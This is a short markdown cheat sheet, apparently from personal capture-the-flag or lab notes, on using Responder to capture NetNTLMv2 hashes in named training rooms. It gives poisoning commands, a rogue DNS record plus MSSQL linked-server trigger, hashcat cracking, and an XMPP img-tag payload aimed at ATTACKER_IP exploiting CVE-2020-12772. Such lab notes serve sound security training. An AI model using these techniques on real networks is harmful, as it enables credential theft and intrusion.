# Responder

LLMNR/NBT-NS/mDNS poisoner and rogue SMB/HTTP server. Used to capture NetNTLM(v1/v2) hashes when a victim attempts to authenticate to an attacker-controlled host.

## Commands Used

### Start Responder on the Breaching AD VPN interface
<!-- cmd: linux -->
```bash
sudo responder -I breachad
```
Used on: **Breaching Active Directory**

captured a NetNTLMv2 challenge for `ZA\svcFileCopy`.

### Start Responder on the VPN interface
<!-- cmd: linux -->
```bash
sudo responder -I tun0
```
Used on: **Overwatch**

combined with a rogue A-record (see `dnstool.md`) to force `SQL07` → attacker IP. When SQL Server tries to reach the linked server, it sends NTLMv2 to our listener.

## Typical Flow (Overwatch)

1. Add DNS A record for `SQL07` → attacker IP (`dnstool`).
2. Start `responder -I tun0`.
3. Trigger MSSQL query: `EXEC ('SELECT @@version') AT SQL07;`
4. Captured NetNTLMv2 hash → crack with `hashcat -m 5600`.

### Start Responder to capture NTLMv2 via XMPP img tag (CVE-2020-12772)
<!-- cmd: linux -->
```bash
sudo responder -I tun0 -v
```
Used on: **Ra**

Combined with CVE-2020-12772 (Spark 2.8.3 `<img>` auto-fetch) — sent
`<img src="http://ATTACKER_IP/x">` in XMPP chat to `buse@fire.windcorp.thm`.
Spark pre-fetched the URL and Responder captured the NTLMv2 hash for `WINDCORP\buse`.


